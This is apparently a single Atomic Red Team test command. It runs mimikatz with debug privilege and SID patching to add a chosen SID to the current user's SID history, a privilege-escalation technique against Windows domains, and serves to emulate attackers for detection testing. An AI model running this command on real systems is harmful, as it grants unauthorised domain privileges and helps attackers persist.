PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username" "exit"